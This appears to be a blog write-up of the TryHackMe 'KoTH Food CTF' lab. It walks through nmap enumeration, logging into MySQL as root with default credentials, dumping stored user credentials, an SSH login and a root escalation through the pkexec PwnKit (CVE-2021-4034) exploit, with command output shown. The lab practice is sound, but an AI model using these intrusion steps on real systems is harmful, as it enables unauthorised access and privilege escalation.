---
title: "KoTH Food CTF"
date: 2025-03-08
image: /assets/img/tryhackme/KoTHFoodCTF/KoTHFoodCTF_image.jpg
description: Writeup of the TryHackMe-CTF KoTH Food CTF
categories: [TryHackMe, Easy]
tags: [linux, pkexec, koth]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>KoTH Food CTF</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Practice Food KoTH alone, to get familiar with KoTH!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/kothfoodctf">https://tryhackme.com/room/kothfoodctf</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge KoTH Food CTF.  

## Enumeration
I started the enumeration using `nmap`:
```bash
kali@kali:~/ctf/KoTHFoodCTF$ nmap -p- 10.10.145.91         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 11:31 EDT
Nmap scan report for 10.10.145.91
Host is up (0.044s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
3306/tcp  open  mysql
9999/tcp  open  abyss
15065/tcp open  unknown
16109/tcp open  unknown
46969/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 52.00 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,3306,9999,15065,16109,46969 10.10.145.91 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 11:33 EDT
Nmap scan report for 10.10.145.91
Host is up (0.046s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:0c:0c:d9:5a:7d:be:e6:f4:3c:ed:10:51:49:4d:19 (RSA)
|   256 17:ce:03:3b:bb:20:78:09:ab:76:c0:6d:8d:c4:df:51 (ECDSA)
|_  256 07:8a:50:b5:5b:4a:a7:6c:c8:b3:a1:ca:77:b9:0d:07 (ED25519)
3306/tcp  open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 5
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, SupportsLoadDataLocal, InteractiveClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, ODBCClient, SupportsCompression, FoundRows, SwitchToSSLAfterHandshake, ConnectWithDatabase, LongColumnFlag, LongPassword, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x0Fh!0\x1Cm8IMjcD"afw"B\x063
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Not valid before: 2020-03-19T17:21:30
|_Not valid after:  2030-03-17T17:21:30
|_ssl-date: TLS randomness does not represent time
9999/tcp  open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Fri, 14 Mar 2025 15:33:08 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|     king
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
15065/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Host monitoring
16109/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Fri, 14 Mar 2025 15:33:08 GMT
|     Content-Type: image/jpeg
|     JFIF
|     #*%%*525EE\xff
|     #*%%*525EE\xff
|     $3br
|     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     Y$?_
|     qR]$Oyk
|_    |$o.
46969/tcp open  telnet  Linux telnetd
```
From here I proceeded the analysis port by port.

## Port 3306 Analysis

I began by analyzing port 3306 and the MySQL instance. Before attempting to brute force the credentials for the root user, I simply tried some default ones and was successded: 
```bash
$ mysql -h 10.10.145.91 -u root -p --skip-ssl-verify-server-cert 
  Enter password: 
  Welcome to the MariaDB monitor.  Commands end with ; or \g.
  Your MySQL connection id is 14
  Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

  Support MariaDB developers by giving a star at https://github.com/MariaDB/server
  Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

  MySQL [(none)]> show databases;
  +--------------------+
  | Database           |
  +--------------------+
  | information_schema |
  | mysql              |
  | performance_schema |
  | sys                |
  | users              |
  +--------------------+
  5 rows in set (0.300 sec)

  MySQL [(none)]> use users;

  MySQL [users]> show tables;
  +-----------------+
  | Tables_in_users |
  +-----------------+
  | User            |
  +-----------------+
  1 row in set (0.042 sec)

  MySQL [users]> select * from User;
  +----------+---------------------------------------+
  | username | password                              |
  +----------+---------------------------------------+
  | ramen    | n[remvoed]t                           |
  | flag     | thm{2[removed]2}                      |
  +----------+---------------------------------------+
  2 rows in set (0.038 sec)
```

Great! I obtained tge credentials and retrieved the first flag. The credentials where valid, and I was able to log in as `ramen`:
```bash
$ ssh ramen@10.10.145.91
ramen@foodctf:/home/ramen$
```

## Privilege Escalation root

While enumerating potential ways to escalate privileges, I retrieved some flags as well:
```bash
ramen@foodctf:/home/bread$ cat flag 
  thm{7[removed]5}

ramen@foodctf:/home/food$ cat .flag
  thm{5[removed]1}

ramen@foodctf:/var$ cat flag.txt
  thm{0[removed]8}

root@foodctf:/var/log/# cat auth.log 
  thm{4[removed]f}
```

I continued by checking for SUID bits and discoverd that `pkexec` had its SUID bit set. I used the exploit described in <a href="https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py">CVE-2021-4034</a> and successfully gained root access:
```bash
ramen@foodctf:/home/tryhackme$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /usr/bin/pkexec
  [...]
ramen@foodctf:~$ python3 exploit.py 
  Do you want to choose a custom payload? y/n (n use default payload)  n
  [+] Cleaning pervious exploiting attempt (if exist)
  [+] Creating shared library for exploit code.
  [+] Finding a libc library to call execve
  [+] Found a library at <CDLL 'libc.so.6', handle 7f2a4e9e5000 at 0x7f2a4d4907f0>
  [+] Call execve() with chosen payload
  [+] Enjoy your root shell
# whoami
  root
# cd /root
# cat flag
  thm{9[removed]b}
# cat .profile
  # ~/.profile: executed by Bourne-compatible login shells.

  if [ "$BASH" ]; then
    if [ -f ~/.bashrc ]; then
      . ~/.bashrc
    fi
  fi

  mesg n || true
  alias wall="echo"
  # thm{2[removed]d}
# cd /home/tryhackme
# cat flag7     
  thm{5[removed]e}
```

Flags:
1. MySQL server
2. /home/bread/flag
3. /home/food/.flag
4. /var/flag.txt
5. /root/flag
6. /var/log/auth.log
7. /home/tryhackme/flag7
8. /root/.profile

There are multiple ways to achieve initial access and privilege escalation; This write-up only showed one possibility :)

solved! :)